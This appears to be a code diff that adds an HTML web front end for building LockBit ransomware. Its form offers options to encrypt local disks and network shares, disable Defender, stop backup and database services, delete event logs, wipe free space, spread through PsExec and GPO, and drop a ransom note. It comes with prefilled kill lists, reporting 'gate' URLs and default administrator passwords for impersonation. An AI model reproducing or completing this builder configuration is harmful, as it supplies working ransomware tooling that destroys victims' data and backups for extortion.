@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+
+<head>
+	<title>Lockbit Builder</title>
+	<script defer src="/index.js"></script>
+	<link rel="preconnect" href="https://fonts.googleapis.com" />
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+	<link href="https://fonts.googleapis.com/css2?family=Josefin+Sans&display=swap" rel="stylesheet" />
+	<link rel="stylesheet" href="/index.css" />
+</head>
+
+<body>
+
+	<div class="top-bar">
+		<img src="/assets/icon.png" class="logo" />
+		<p class="title">Lockbit Web GUI</p>
+	</div>
+	<div class="options">
+		<div class="form-container">
+			<form id="my-form">
+				<div class="settings">
+					<label>
+						Encrypt mode:
+						<select name="encrypt_mode">
+							<option value="auto">Auto</option>
+							<option value="on">On</option>
+							<option value="off">Off</option>
+						</select>
+					</label>
+					<br>
+
+					<label>
+						Encrypt filename:
+						<input type="checkbox" name="encrypt_filename">
+					</label>
+					<br>
+
+					<label>
+						Impersonation:
+						<input type="checkbox" name="impersonation" checked>
+					</label>
+					<br>
+
+					<label>
+						Skip hidden folders:
+						<input type="checkbox" name="skip_hidden_folders">
+					</label>
+					<br>
+
+					<label>
+						Language check:
+						<input type="checkbox" name="language_check">
+					</label>
+					<br>
+
+					<label>
+						Local disks:
+						<input type="checkbox" name="local_disks" checked>
+					</label>
+					<br>
+
+					<label>
+						Network shares:
+						<input type="checkbox" name="network_shares" checked>
+					</label>
+					<br>
+
+					<label>
+						Kill processes:
+						<input type="checkbox" name="kill_processes" checked>
+					</label>
+					<br>
+
+					<label>
+						Kill services:
+						<input type="checkbox" name="kill_services" checked>
+					</label>
+					<br>
+
+					<label>
+						Running one:
+						<input type="checkbox" name="running_one" checked>
+					</label>
+					<br>
+
+					<label>
+						Print note:
+						<input type="checkbox" name="print_note" checked>
+					</label>
+					<br>
+
+					<label>
+						Set wallpaper:
+						<input type="checkbox" name="set_wallpaper" checked>
+					</label>
+					<br>
+
+					<label>
+						Set icons:
+						<input type="checkbox" name="set_icons" checked>
+					</label>
+					<br>
+
+					<label>
+						Send report:
+						<input type="checkbox" name="send_report">
+					</label>
+					<br>
+
+					<label>
+						Self destruct:
+						<input type="checkbox" name="self_destruct" checked>
+					</label>
+					<br>
+
+					<label>
+						Kill defender:
+						<input type="checkbox" name="kill_defender" checked>
+					</label>
+					<br>
+
+					<label>
+						Wipe freespace:
+						<input type="checkbox" name="wipe_freespace">
+					</label>
+					<br>
+
+					<label>
+						Psexec netspread:
+						<input type="checkbox" name="psexec_netspread">
+					</label>
+					<br>
+
+					<label>
+						Gpo netspread:
+						<input type="checkbox" name="gpo_netspread" checked>
+					</label>
+					<br>
+
+					<label>
+						Gpo ps update:
+						<input type="checkbox" name="gpo_ps_update" checked>
+					</label>
+					<br>
+
+					<label>
+						Shutdown system:
+						<input type="checkbox" name="shutdown_system">
+					</label>
+					<br>
+
+					<label>
+						Delete eventlogs:
+						<input type="checkbox" name="delete_eventlogs" checked>
+					</label>
+					<br>
+
+					<label>
+						Delete gpo delay:
+						<input type="number" name="delete_gpo_delay" placeholder="1" min="1" max="10">
+					</label>
+					<br>
+				</div>
+				<div class="outside">
+					<label>
+						Whitelisted folders:
+						<input type="text" name="white_folders"
+							placeholder="$recycle.bin;config.msi;$windows.~bt;$windows.~ws;windows;boot;program files;program files (x86);programdata;system volume information;tor browser;windows.old;intel;msocache;perflogs;x64dbg;public;all users;default;microsoft">
+					</label>
+					<br>
+					<label>
+						Whitelisted files:
+						<input type="text" name="white_files"
+							placeholder="autorun.inf;boot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntldr;ntuser.dat;ntuser.dat.log;ntuser.ini;thumbs.db;GDIPFONTCACHEV1.DAT;d3d9caps.dat">
+					</label>
+					<br>
+					<label>
+						Whitelisted extensions:
+						<input type="text" name="white_extens"
+							placeholder="386;adv;ani;bat;bin;cab;cmd;com;cpl;cur;deskthemepack;diagcab;diagcfg;diagpkg;dll;drv;exe;hlp;icl;icns;ico;ics;idx;ldf;lnk;mod;mpa;msc;msp;msstyles;msu;nls;nomedia;ocx;prf;ps1;rom;rtp;scr;shs;spl;sys;theme;themepack;wpx;lock;key;hta;msi;pdb;search-ms">
+					</label>
+					<br>
+					<label>
+						Whitelisted hosts:
+						<input type="text" name="white_hosts" placeholder="WS2019">
+					</label>
+					<br>
+					<label>
+						Kill processes:
+						<input type="text" name="kill_processes"
+							placeholder="sql;oracle;ocssd;dbsnmp;synctime;agntsvc;isqlplussvc;xfssvccon;mydesktopservice;ocautoupds;encsvc;firefox;tbirdconfig;mydesktopqos;ocomm;dbeng50;sqbcoreservice;excel;infopath;msaccess;mspub;onenote;outlook;powerpnt;steam;thebat;thunderbird;visio;winword;wordpad;notepad;calc;wuauclt;onedrive">
+					</label>
+					<br>
+					<label>
+						Kill services:
+						<input type="text" name="kill_services"
+							placeholder="vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr">
+					</label>
+					<br>
+					<label>
+						Gate urls:
+						<input type="text" name="gate_urls"
+							placeholder="https://test.white-datasheet.com/;http://test.white-datasheet.com/">
+					</label>
+					<br>
+					<label>
+						Impersonation Accounts:
+						<input type="text" name="impers_accounts"
+							placeholder="ad.lab:Qwerty!;Administrator:123QWEqwe!@#;Admin2:P@ssw0rd;Administrator:P@ssw0rd;Administrator:Qwerty!;Administrator:123QWEqwe;Administrator:123QWEqweqwe">
+					</label>
+					<br>
+					<label>
+						Ransom note:
+						<input type="text" name="note"
+							placeholder="Builded by Andrea Licheri. If you actually had run this program, just know you fucked up lol.">
+					</label>
+					<br>
+				</div>
+				<button type="submit">Submit</button>
+			</form>
+		</div>
+	</div>
+</body>
